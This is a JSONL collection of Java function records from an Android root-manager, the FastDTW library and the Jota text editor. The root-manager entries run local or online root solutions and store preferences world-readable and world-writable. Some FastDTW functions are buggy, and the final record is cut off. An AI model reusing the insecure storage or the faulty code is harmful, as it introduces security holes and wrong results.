{"docstring": "/**\n * \u68c0\u67e5\u6587\u4ef6\u6570\u91cf\uff0c\u64cd\u4f5c15\u4e2a\u6587\u4ef6\u9700\u8981\u5220\u9664\u591a\u4f59\u6587\u4ef6\n */\n", "func_signal": "private void checkFileNum()", "code": "{\n\tFile localFile = new File(this.mContext.getFilesDir().getAbsolutePath()\n\t\t\t+ \"/permmgr\");\n\tFile[] arrayOfFile = new File[] {};\n\tif (localFile.exists()) {\n\t\tarrayOfFile = localFile.listFiles();\n\t\tif (arrayOfFile.length <= 15)\n\t\t\treturn;\n\t}\n}", "path": "src\\com\\qihoo\\permmgr\\PermManager.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u6267\u884cROOT\u65b9\u6848\n */\n", "func_signal": "private int doRootSolution()", "code": "{\n\tif (getRTService() != null) {\n\t\treturn Constants.ROOT_SUCCESS;\n\t}\n\tPermManager permManager = PermManager.getInstance(this);\n\tsetStatus(\"trying to save env_file.\\n\");\n\tpermManager.saveEnv();\n\tSharedStore store = new SharedStore(this, Constants.SOLUTION_FILE);\n\tString md5 = store.getString(Constants.KEY_SOLUTION_MD5, \"\");\n\tif (TextUtils.isEmpty(md5)) {\n\t\tsetStatus(\"trying to do local solution...\\n\");\n\t\tif (permManager.doSolutionLocal() != Constants.ROOT_SUCCESS) {\n\t\t\tsetStatus(\"trying to do online solution...\\n\");\n\t\t\treturn permManager.doSolutionOnline(this);\n\t\t} else {\n\t\t\treturn Constants.ROOT_SUCCESS;\n\t\t}\n\t} else {\n\t\tsetStatus(\"trying to do success solution...\\n\");\n\t\treturn permManager.doSuccessSolution(md5);\n\t}\n}", "path": "src\\com\\uucun\\root\\MainActivity.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u6539\u53d8permmgr.xml\u4e3aroot\u6743\u9650\n */\n", "func_signal": "private void changeUidToMyReal()", "code": "{\n\tint i = this.mMyRealUid;\n\ttry {\n\t\tif (Process.myUid() == 0) {\n\t\t\tFile localFile = new File(\"/data/data/\"\n\t\t\t\t\t+ this.mContext.getPackageName() + \"/shared_prefs/\");\n\t\t\tString[] arrayOfString = new String[3];\n\t\t\tarrayOfString[0] = \"chown\";\n\t\t\tarrayOfString[1] = (i + \".\" + i);\n\t\t\tarrayOfString[2] = \"permmgr.xml\";\n\t\t\tcom.qihoo.permmgr.util.b.a(localFile, arrayOfString);\n\t\t}\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n}", "path": "src\\com\\qihoo\\permmgr\\PermManager.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u5b9e\u4f8b\u5316\u4fdd\u5b58\u6570\u636e\u5bf9\u8c61\n * \n * @param context\n *            \u4e0a\u4e0b\u6587 {@link Context}\n * @param name\n *            \u6587\u4ef6\u7684\u540d\u79f0 \u53ef\u4ee5\u4e3anull,\u9ed8\u8ba4uu_config\n */\n", "func_signal": "public SharedStore(Context context, String name)", "code": "{\n\tthis.mContext = context;\n\tif (!TextUtils.isEmpty(name)) {\n\t\tfileName = name;\n\t}\n\tmSharedPreferences = mContext.getSharedPreferences(fileName,\n\t\t\tContext.MODE_WORLD_READABLE + Context.MODE_WORLD_WRITEABLE);\n\tmEditor = mSharedPreferences.edit();\n}", "path": "src\\com\\qihoo\\sharestore\\SharedStore.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u5199\u5165\u4e00\u4e2aint\u6570\u636e\n * \n * @param key\n *            \u5bf9\u8c61key\n * @param value\n *            \u5bf9\u8c61\u503c\n * @author Melvin\n * @date 2013-4-22\n * @return void\n */\n", "func_signal": "public void putInt(String key, int value)", "code": "{\n\tmEditor.putInt(key, value);\n\tmEditor.commit();\n}", "path": "src\\com\\qihoo\\sharestore\\SharedStore.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "/**\n * \u8bfb\u53d6\u7f13\u51b2\u533a\n */\n", "func_signal": "private static String readStream(InputStream is, String charsetName)", "code": "{\n\ttry {\n\t\tBufferedReader br = new BufferedReader(new InputStreamReader(is, charsetName));\n\t\tchar[] buffer = new char[1024];\n\t\tStringBuilder sb = new StringBuilder();\n\t\twhile (true) {\n\t\t\tint i = br.read(buffer);\n\t\t\tif (i == -1) {\n\t\t\t\treturn sb.toString();\n\t\t\t} \n\t\t\tsb.append(buffer, 0, i);\n\t\t}\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\treturn null;\n}", "path": "src\\com\\qihoo\\permmgr\\util\\b.java", "repo_name": "hewu2008/root-manager", "stars": 126, "license": "None", "language": "java", "size": 1427}
{"docstring": "// end removeFirst()\n", "func_signal": "public void normalize()", "code": "{\n      // Calculate the mean of each FD.\n      final double[] mean = new double[this.numOfDimensions()];\n      for (int col = 0; col < numOfDimensions(); col++) {\n          double currentSum = 0.0;\n          for (int row = 0; row < this.size(); row++)\n              currentSum += this.getMeasurement(row, col);\n\n          mean[col] = currentSum / this.size();\n      }  // end for loop\n\n      // Calculate the standard deviation of each FD.\n      final double[] stdDev = new double[numOfDimensions()];\n      for (int col = 0; col < numOfDimensions(); col++) {\n          double variance = 0.0;\n          for (int row = 0; row < this.size(); row++)\n              variance += Math.abs(getMeasurement(row, col) - mean[col]);\n\n          stdDev[col] = variance / this.size();\n      }  // end for loop\n\n\n      // Normalize the values in the data using the mean and standard deviation\n      //    for each FD.  =>  Xrc = (Xrc-Mc)/SDc\n      for (int row = 0; row < this.size(); row++) {\n          for (int col = 0; col < numOfDimensions(); col++) {\n              // Normalize data point.\n              if (stdDev[col] == 0.0)   // prevent divide by zero errors\n                  setMeasurement(row, col, 0.0);  // stdDev is zero means all pts identical\n              else   // typical case\n                  setMeasurement(row, col, (getMeasurement(row, col) - mean[col]) / stdDev[col]);\n          }  // end for loop\n      }  // end for loop\n  }", "path": "src\\main\\java\\com\\timeseries\\TimeSeries.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "/**\n * Ad-hoc constructor from a double array\n * ONLY ONE FIXED COLUMN\n */\n", "func_signal": "public TimeSeries(double[] x)", "code": "{\n    // DS to create labels and values\n    AtomicInteger counter = new AtomicInteger();\n    TimeSeriesPoint tsValues;\n\n    // Only one time series\n    timeReadings = new ArrayList();\n    ArrayList values;\n\n    // Each value is one incremented label\n    labels = new ArrayList();\n    labels.add(\"Time\");\n    labels.add(\"c1\");\n\n    tsArray = new ArrayList();\n    for (double value : x) {\n        timeReadings.add((double) counter.getAndIncrement());\n        values = new ArrayList();\n        values.add(value);\n        tsValues = new TimeSeriesPoint(values);\n        tsArray.add(tsValues);\n    }\n}", "path": "src\\main\\java\\com\\timeseries\\TimeSeries.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// Returns the first non-digit (and not a '.') character in a file under the\n//    assumption that it is the delimiter in the file.\n", "func_signal": "private static char determineDelimiter(String filePath)", "code": "{\n    final char DEFAULT_DELIMITER = ',';\n\n    try {\n        final BufferedReader in = new BufferedReader(new FileReader(filePath));\n\n        String line = in.readLine().trim();   // read first line\n\n        if (!Character.isDigit(line.charAt(0)))  // go to 2nd line if 1st line appears to be labels\n            line = in.readLine();\n\n        in.close();\n\n        // Searches the 2nd line of the file until a non-number character is\n        //    found.  The delimiter is assumed to be that character.\n        //    numbers, minus signs, periods, and 'E' (exponent) are accepted\n        //    number characters.\n        for (int x = 0; x < line.length(); x++) {\n            if (!Character.isDigit(line.charAt(x)) && (line.charAt(x) != '.') && (line.charAt(x) != '-') &&\n                    (Character.toUpperCase(line.charAt(x)) != 'E'))\n                return line.charAt(x);\n        }\n\n        // No delimiters were found, which means that there must be only one column\n        //    A delimiter does not need to be known to read this file.\n        return DEFAULT_DELIMITER;\n    } catch (IOException e) {\n        return DEFAULT_DELIMITER;\n    }\n}", "path": "src\\main\\java\\com\\timeseries\\TimeSeries.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// Copy Constructor\n", "func_signal": "public TimeSeries(TimeSeries origTS)", "code": "{\n    labels = new ArrayList(origTS.labels);\n    timeReadings = new ArrayList(origTS.timeReadings);\n    tsArray = new ArrayList(origTS.tsArray);\n}", "path": "src\\main\\java\\com\\timeseries\\TimeSeries.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// Create a new WarpPath that is the same as THIS WarpPath, but J is the reference template, rather than I.\n", "func_signal": "public WarpPath invertedCopy()", "code": "{\n   final WarpPath newWarpPath = new WarpPath();\n   for (int x=0; x<tsIindexes.size(); x++)\n      newWarpPath.addLast(((Integer)tsJindexes.get(x)).intValue(), ((Integer)tsIindexes.get(x)).intValue());\n\n   return newWarpPath;\n}", "path": "src\\main\\java\\com\\dtw\\WarpPath.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// end Constructor\n", "func_signal": "public boolean equals(Object o)", "code": "{\n    return (o instanceof ColMajorCell) &&\n           (((ColMajorCell)o).col == this.col) &&\n           (((ColMajorCell)o).row == this.row);\n }", "path": "src\\main\\java\\com\\matrix\\ColMajorCell.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// end getMatchingIndexesForI(int i)\n", "func_signal": "public ArrayList getMatchingIndexesForJ(int j)", "code": "{\n    int index = tsJindexes.indexOf(new Integer(j));\n    if (index < 0)\n       throw new InternalError(\"ERROR:  index '\" + j + \" is not in the \" +\n                               \"warp path.\");\n    final ArrayList matchingIs = new ArrayList();\n    while (index<tsJindexes.size() && tsJindexes.get(index).equals(new Integer(j)))\n       matchingIs.add(tsIindexes.get(index++));\n\n    return matchingIs;\n }", "path": "src\\main\\java\\com\\dtw\\WarpPath.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// end toString()\n", "func_signal": "protected void setMaxCapacity(int capacity)", "code": "{\n      this.timeReadings.ensureCapacity(capacity);\n      this.tsArray.ensureCapacity(capacity);\n  }", "path": "src\\main\\java\\com\\timeseries\\TimeSeries.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// PUBLIC FUNCTIONS\n", "func_signal": "public static void main(String[] args)", "code": "{\n   if (args.length!=2 && args.length!=3)\n   {\n      System.out.println(\"USAGE:  java DtwTest timeSeries1 timeSeries2 [EuclideanDistance|ManhattanDistance|BinaryDistance]\");\n      System.exit(1);\n   }\n   else\n   {\n      final TimeSeries tsI = new TimeSeries(args[0], false, false, ',');\n      final TimeSeries tsJ = new TimeSeries(args[1], false, false, ',');\n      \n      final DistanceFunction distFn;\n      if (args.length < 3)\n      {\n         distFn = DistanceFunctionFactory.getDistFnByName(\"EuclideanDistance\"); \n      }\n      else\n      {\n         distFn = DistanceFunctionFactory.getDistFnByName(args[2]);\n      }   // end if\n      \n      final TimeWarpInfo info = com.dtw.DTW.getWarpInfoBetween(tsI, tsJ, distFn);\n\n      System.out.println(\"Warp Distance: \" + info.getDistance());\n      System.out.println(\"Warp Path:     \" + info.getPath());\n   }  // end if\n\n}", "path": "src\\main\\java\\com\\DtwTest.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// FUNCTIONS\n", "func_signal": "public void save(File outFile) throws IOException", "code": "{\n    final PrintWriter out = new PrintWriter(new FileOutputStream(outFile));\n    out.write(this.toString());\n    out.flush();\n    out.close();\n}", "path": "src\\main\\java\\com\\timeseries\\TimeSeries.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// end invert()\n", "func_signal": "public ColMajorCell get(int index)", "code": "{\n    if ( (index>this.size()) || (index<0) )\n       throw new NoSuchElementException();\n    else\n       return new ColMajorCell(((Integer)tsIindexes.get(index)).intValue(),\n                               ((Integer)tsJindexes.get(index)).intValue());\n }", "path": "src\\main\\java\\com\\dtw\\WarpPath.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// PUBLIC FUNCTIONS\n", "func_signal": "public void put(int col, int row, double value)", "code": "{\n   if ( (row<window.minJforI(col)) || (row>window.maxJforI(col)) )\n   {\n      throw new InternalError(\"CostMatrix is filled in a cell (col=\" + col + \", row=\" + row + \") that is not in the \" +\n                               \"search window\");\n   }\n   else\n   {\n      if (col == currColIndex)\n         currCol[row-minCurrRow] = value;\n      else if (col == currColIndex-1)\n         lastCol[row-minLastRow] = value;\n      else if (col == currColIndex+1)\n      {\n         lastCol = currCol;\n         minLastRow = minCurrRow;\n         currColIndex++;\n         currCol = new double[window.maxJforI(col)-window.minJforI(col)+1];\n         minCurrRow = window.minJforI(col);\n\n         currCol[row-minCurrRow] = value;\n      }\n      else\n         throw new InternalError(\"A PartialWindowMatrix can only fill in 2 adjacentcolumns at a time\");\n   }  // end if\n}", "path": "src\\main\\java\\com\\dtw\\PartialWindowMatrix.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// CONSTRUCTORS\n", "func_signal": "public WarpPath()", "code": "{\n   tsIindexes = new ArrayList();\n   tsJindexes = new ArrayList();\n}", "path": "src\\main\\java\\com\\dtw\\WarpPath.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// CONSTRUCTOR\n", "func_signal": "public FullWindow(TimeSeries tsI, TimeSeries tsJ)", "code": "{\n   super(tsI.size(), tsJ.size());\n\n   for (int i=0; i<tsI.size(); i++)\n   {\n      super.markVisited(i, minJ());\n      super.markVisited(i, maxJ());\n   }  // end for loop\n}", "path": "src\\main\\java\\com\\dtw\\FullWindow.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// PUBLIC FUNCTIONS\n", "func_signal": "public static void main(String[] args)", "code": "{\n   if (args.length!=3 && args.length!=4)\n   {\n      System.out.println(\"USAGE:  java BandTest timeSeries1 timeSeries2 radius [EuclideanDistance|ManhattanDistance|BinaryDistance]\");\n      System.exit(1);\n   }\n   else\n   {\n      final TimeSeries tsI = new TimeSeries(args[0], false, false, ',');\n      final TimeSeries tsJ = new TimeSeries(args[1], false, false, ',');\n\n      final DistanceFunction distFn;\n      if (args.length < 4)\n      {\n         distFn = DistanceFunctionFactory.getDistFnByName(\"EuclideanDistance\"); \n      }\n      else\n      {\n         distFn = DistanceFunctionFactory.getDistFnByName(args[3]);\n      }   // end if\n      \n      final TimeWarpInfo info = com.dtw.DTW.getWarpInfoBetween(tsI, tsJ, new LinearWindow(tsI, tsJ, Integer.parseInt(args[2])), distFn);\n      \n      System.out.println(\"Warp Distance: \" + info.getDistance());\n      System.out.println(\"Warp Path:     \" + info.getPath());\n   }  // end if\n\n}", "path": "src\\main\\java\\com\\BandTest.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// end determineDelimiter(.)\n", "func_signal": "private static double extractFirstNumber(String str)", "code": "{\n      StringBuffer numStr = new StringBuffer();\n\n      // Keep adding characters onto numStr until a non-number character\n      //    is reached.\n      for (int x = 0; x < str.length(); x++) {\n          if ((Character.isDigit(str.charAt(x))) || (str.charAt(x) == '.') || (str.charAt(x) == '-') ||\n                  (Character.toUpperCase(str.charAt(x)) == 'E'))\n              numStr.append(str.charAt(x));\n          else\n              Double.parseDouble(numStr.toString());\n      }  // end for loop\n\n      return -1;\n  }", "path": "src\\main\\java\\com\\timeseries\\TimeSeries.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// end doubleToByte(.)\n", "func_signal": "public static byte[] doubleArrayToByteArray(double[] numbers)", "code": "{\n    final int doubleSize = 8;  // 8 byes in a double\n    final byte[] byteArray = new byte[numbers.length*doubleSize];\n\n    for (int x=0; x<numbers.length; x++)\n       System.arraycopy(doubleToByteArray(numbers[x]), 0, byteArray, x*doubleSize, doubleSize);\n\n    return byteArray;\n }", "path": "src\\main\\java\\com\\lang\\TypeConversions.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// end addFirst(..)\n", "func_signal": "public void addLast(double time, TimeSeriesPoint values)", "code": "{\n      if (labels.size() != values.size() + 1)  // labels include a label for time\n          throw new InternalError(\"ERROR:  The TimeSeriesPoint: \" + values +\n                  \" contains the wrong number of values. \" +\n                  \"expected:  \" + labels.size() + \", \" +\n                  \"found: \" + values.size());\n\n      if ((this.size() > 0) && (time <= ((Double) timeReadings.get(timeReadings.size() - 1)).doubleValue()))\n          throw new InternalError(\"ERROR:  The point being inserted at the \" +\n                  \"end of the time series does not have \" +\n                  \"the correct time sequence. \");\n\n      timeReadings.add(new Double(time));\n      tsArray.add(values);\n  }", "path": "src\\main\\java\\com\\timeseries\\TimeSeries.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// PUBLIC FUNCTIONS\n", "func_signal": "public void put(int col, int row, double value)", "code": "{\n   if ((row<window.minJforI(col)) || (row>window.maxJforI(col)))\n   {\n      throw new InternalError(\"CostMatrix is filled in a cell (col=\"+col+\", row=\"+row+\") that is not in the \"+\n                              \"search window\");\n   }\n   else\n      cellValues[colOffsets[col]+row-window.minJforI(col)] = value;\n}", "path": "src\\main\\java\\com\\dtw\\MemoryResidentMatrix.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "// Automatically determines if the first column in a file is time measurements.\n//    It assumes that a column of time will have equal spacing between all\n//    values.\n", "func_signal": "private static boolean determineIsFirstColTime(String filePath)", "code": "{\n    final boolean DEFAULT_VALUE = false;\n\n    try {\n        final BufferedReader in = new BufferedReader(new FileReader(filePath));\n\n        // This parameter is the percentage of flexibility that is permitted from\n        //    a perfectly even distribution of time values.  This function will\n        //    most likely not work if this is set to zero because of floating-\n        //    point math roundoff errors.\n        //    (a setting of '0.05' is '5 percent')\n        final double EQUALITY_FLEXIBILITY_PCT = 0.001;\n\n        final int NUM_OF_VALUES_TO_CMP = 100;   // $ of time values to look examine\n\n        final Vector possibleTimeValues = new Vector(NUM_OF_VALUES_TO_CMP);  // 'stores numOfValuesToCompare' values\n\n        // Read the first 'numOfValuesToCompare' possible time values from the file\n        //    and store them in 'possibleTimeValues'.\n        String line = in.readLine();\n\n        while ((possibleTimeValues.size() < NUM_OF_VALUES_TO_CMP) && ((line = in.readLine()) != null))\n            possibleTimeValues.add(new Double(extractFirstNumber(line)));\n\n        if (possibleTimeValues.size() <= 1)\n            return DEFAULT_VALUE;\n\n        // See if there is equal spacing (with a flexibility of\n        //    'equalityFlexibilityFactor') between all values in              // TODO TimeSeries is now messy...in need of design\n        //    'possibleTimeValues'.\n        if ((possibleTimeValues.size() > 1) && possibleTimeValues.get(1).equals(possibleTimeValues.get(0)))\n            return DEFAULT_VALUE;   // special case needed for very flat data\n\n\n        final double expectedDiff = ((Double) possibleTimeValues.get(1)).doubleValue() -\n                ((Double) possibleTimeValues.get(0)).doubleValue();\n        final double flexibility = expectedDiff * EQUALITY_FLEXIBILITY_PCT;\n        for (int x = 1; x < possibleTimeValues.size(); x++) {\n            if (Math.abs(((Double) possibleTimeValues.get(x)).doubleValue() -\n                    ((Double) possibleTimeValues.get(x - 1)).doubleValue() - expectedDiff)\n                    > Math.abs(flexibility)) {\n                return false;\n            }\n        }   // end for loop\n\n        return true;\n    } catch (IOException e) {\n        return DEFAULT_VALUE;\n    }\n}", "path": "src\\main\\java\\com\\timeseries\\TimeSeries.java", "repo_name": "rmaestre/FastDTW", "stars": 64, "license": "mit", "language": "java", "size": 324}
{"docstring": "/**\n * The {@link BillingReceiver} sends messages to this service using intents.\n * Each intent has an action and some extra arguments specific to that action.\n * @param intent the intent containing one of the supported actions\n * @param startId an identifier for the invocation instance of this service\n */\n", "func_signal": "public void handleCommand(Intent intent, int startId)", "code": "{\n    String action = intent.getAction();\n    if (Consts.DEBUG) {\n        Log.i(TAG, \"handleCommand() action: \" + action);\n    }\n    if (Consts.ACTION_CONFIRM_NOTIFICATION.equals(action)) {\n        String[] notifyIds = intent.getStringArrayExtra(Consts.NOTIFICATION_ID);\n        confirmNotifications(startId, notifyIds);\n    } else if (Consts.ACTION_GET_PURCHASE_INFORMATION.equals(action)) {\n        String notifyId = intent.getStringExtra(Consts.NOTIFICATION_ID);\n        getPurchaseInformation(startId, new String[] { notifyId });\n    } else if (Consts.ACTION_PURCHASE_STATE_CHANGED.equals(action)) {\n        String signedData = intent.getStringExtra(Consts.INAPP_SIGNED_DATA);\n        String signature = intent.getStringExtra(Consts.INAPP_SIGNATURE);\n        purchaseStateChanged(startId, signedData, signature);\n    } else if (Consts.ACTION_RESPONSE_CODE.equals(action)) {\n        long requestId = intent.getLongExtra(Consts.INAPP_REQUEST_ID, -1);\n        int responseCodeIndex = intent.getIntExtra(Consts.INAPP_RESPONSE_CODE,\n                ResponseCode.RESULT_ERROR.ordinal());\n        ResponseCode responseCode = ResponseCode.valueOf(responseCodeIndex);\n        checkResponseCode(requestId, responseCode);\n    }\n}", "path": "src\\jp\\sblo\\pandora\\billing\\BillingService.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * This is called when we are connected to the MarketBillingService.\n * This runs in the main UI thread.\n */\n", "func_signal": "public void onServiceConnected(ComponentName name, IBinder service)", "code": "{\n    if (Consts.DEBUG) {\n        Log.d(TAG, \"Billing service connected\");\n    }\n    mService = IMarketBillingService.Stub.asInterface(service);\n    runPendingRequests();\n}", "path": "src\\jp\\sblo\\pandora\\billing\\BillingService.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "// Documentation from interface\n", "func_signal": "public SpannableStringBuilder delete(int start, int end)", "code": "{\n    SpannableStringBuilder ret = replace(start, end, \"\", 0, 0);\n\n    if (mGapLength > 2 * length())\n        resizeFor(length());\n\n    return ret; // == this\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * @hide\n * Returns the maximum scroll value in x.\n */\n", "func_signal": "public static int getMaxScrollX(TextView widget, Layout layout, int y)", "code": "{\n    int top = layout.getLineForVertical(y);\n    int bottom = layout.getLineForVertical(y + widget.getHeight()\n            - widget.getTotalPaddingTop() -widget.getTotalPaddingBottom());\n    int left = Integer.MAX_VALUE;\n    int right = 0;\n    for (int i = top; i <= bottom; i++) {\n        left = (int) Math.min(left, layout.getLineLeft(i));\n        right = (int) Math.max(right, layout.getLineRight(i)+sLineNumberWidth);    // Jota Text Editor\n    }\n    return right - left - widget.getWidth() - widget.getTotalPaddingLeft()\n            - widget.getTotalPaddingRight();\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\Touch.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Return the char at the specified offset within the buffer.\n */\n", "func_signal": "public char charAt(int where)", "code": "{\n    int len = length();\n    if (where < 0) {\n        throw new IndexOutOfBoundsException(\"charAt: \" + where + \" < 0\");\n    } else if (where >= len) {\n        throw new IndexOutOfBoundsException(\"charAt: \" + where +\n                                            \" >= length \" + len);\n    }\n\n    if (where >= mGapStart)\n        return mText[where + mGapLength];\n    else\n        return mText[where];\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "//        void startScroll(int distance, int duration) {\n//            int initialY = distance < 0 ? Integer.MAX_VALUE : 0;\n//            mLastFlingY = initialY;\n//            mScroller.startScroll(0, initialY, 0, distance, duration);\n//            mTouchMode = TOUCH_MODE_FLING;\n//            post(this);\n//        }\n", "func_signal": "private void endFling()", "code": "{\n            mTouchMode = TOUCH_MODE_REST;\n\n//            reportScrollStateChange(OnScrollListener.SCROLL_STATE_IDLE);\n//            clearScrollingCache();\n\n            if ( mWidget != null ){\n                mWidget.removeCallbacks(this);\n                mWidget.moveCursorToVisibleOffset();\n\n                mWidget = null;\n            }\n\n//            if (mPositionScroller != null) {\n//                removeCallbacks(mPositionScroller);\n//            }\n        }", "path": "src\\jp\\sblo\\pandora\\jota\\text\\Touch.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Verifies that the data was signed with the given signature, and calls\n * {@link ResponseHandler#purchaseResponse(Context, PurchaseState, String, String, long)}\n * for each verified purchase.\n * @param startId an identifier for the invocation instance of this service\n * @param signedData the signed JSON string (signed, not encrypted)\n * @param signature the signature for the data, signed with the private key\n */\n", "func_signal": "private void purchaseStateChanged(int startId, String signedData, String signature)", "code": "{\n    ArrayList<Security.VerifiedPurchase> purchases;\n    purchases = Security.verifyPurchase(signedData, signature);\n    if (purchases == null) {\n        return;\n    }\n\n    ArrayList<String> notifyList = new ArrayList<String>();\n    for (VerifiedPurchase vp : purchases) {\n        if (vp.notificationId != null) {\n            notifyList.add(vp.notificationId);\n        }\n        ResponseHandler.purchaseResponse(this, vp.purchaseState, vp.productId,\n                vp.orderId, vp.purchaseTime, vp.developerPayload);\n    }\n    if (!notifyList.isEmpty()) {\n        String[] notifyIds = notifyList.toArray(new String[notifyList.size()]);\n        confirmNotifications(startId, notifyIds);\n    }\n}", "path": "src\\jp\\sblo\\pandora\\billing\\BillingService.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "/**\n * Create a new SpannableStringBuilder containing a copy of the\n * specified slice of the specified text, including its spans if any.\n */\n", "func_signal": "public SpannableStringBuilder(CharSequence text, int start, int end)", "code": "{\n    int srclen = end - start;\n\n    int len = ArrayUtils.idealCharArraySize(srclen + 1);\n    mText = new char[len];\n    mGapStart = srclen;\n    mGapLength = len - srclen;\n\n    TextUtils.getChars(text, start, end, mText, 0);\n\n    mSpanCount = 0;\n    int alloc = ArrayUtils.idealIntArraySize(0);\n    mSpans = new Object[alloc];\n    mSpanStarts = new int[alloc];\n    mSpanEnds = new int[alloc];\n    mSpanFlags = new int[alloc];\n\n    if (text instanceof Spanned) {\n        Spanned sp = (Spanned) text;\n        Object[] spans = sp.getSpans(start, end, Object.class);\n\n        for (int i = 0; i < spans.length; i++) {\n            if (spans[i] instanceof NoCopySpan) {\n                continue;\n            }\n\n            int st = sp.getSpanStart(spans[i]) - start;\n            int en = sp.getSpanEnd(spans[i]) - start;\n            int fl = sp.getSpanFlags(spans[i]);\n\n            if (st < 0)\n                st = 0;\n            if (st > end - start)\n                st = end - start;\n\n            if (en < 0)\n                en = 0;\n            if (en > end - start)\n                en = end - start;\n\n            setSpan(spans[i], st, en, fl);\n        }\n    }\n}", "path": "src\\jp\\sblo\\pandora\\jota\\text\\SpannableStringBuilder.java", "repo_name": "jiro-aqua/Jota-Text-Editor-old", "stars": 64, "license": "None", "language": "java", "size": 1694}
{"docstring": "// Documentation from interface\n", "func_signal": "public SpannableStringBuilder replace(final int start, final int end,\n                    CharSequence tb, int tbstart, int tbend)", "code": "{\n    int filtercount = mFilters.length;\n    for (int i = 0; i < filtercount; i++) {\n        CharSequence repl = mFilters[i].filter(tb, tbstart, tbend,\n                                               this, start, end);\n\n        if (repl != null) {\n            tb = repl;\n            tbstart = 0;\n            tbend = repl.length();\n        }\n    }\n\n    if (end == start && tbstart == tbend) {\n        return this;\n    }\n\n    if (end == start || tbstart == tbend) {\n        change(start, end, tb, tbstart, tbend);\n    } else {\n        int selstart = Selection.getSelectionStart(this);\n        int selend = Selection.getSelectionEnd(this);\n\n        // XXX just make the span fixups in change() do the right thing\n        // instead of this madness!\n\n        checkRange(\"replace\", start, end);\n        moveGapTo(end);\n        TextWatcher[] recipients;\n\n        recipients = sendTextWillChange(start, end - start,\n                                        tbend - tbstart);\n\n        int origlen = end - start;\n\n        if (mGapLength < 2)\n            resizeFor(length() + 1);\n\n        for (int i = mSpanCount - 1; i >= 0; i--) {\n            if (mSpanStarts[i] == mGapStart)\n                mSpanStarts[i]++;\n\n            if (mSpanEnds[i] == mGapStart)\n                mSpanEnds[i]++;\n        }\n\n        mText[mGapStart] = ' ';\n        mGapStart++;\n        mGapLength--;\n\n        if (mGapLength < 1)\n            new Exception(\"mGapLength < 1\").printStackTrace();\n\n        int oldlen = (end + 1) - start;\n\n        int inserted = change(false, start + 1, start + 1,\n                              tb, tbstart, tbend);\n        change(false, start, start + 1, \"\", 0, 0);\n        change(false, start + inserted, start + inserted + oldlen - 1,\n               \"\", 0, 0);\n\n        /*\n         * Special case to keep the cursor in the same position\n         * if it was somewhere in the middle of the replaced region.\n         * If it was at the start or the end or crossing the whole\n         * replacement, it should already be where it belongs.\n         * TODO: Is there some more general mechanism that could\n         * accomplish this?\n         */\n        if (selstart > start && selstart < end) {\n            long off = selstart - start;\n\n            off = off * inserted / (end - start);\n            selstart = (int) off + start;\n\n            setSpan(false, Selection.SELECTION_START, selstart, selstart,\n                    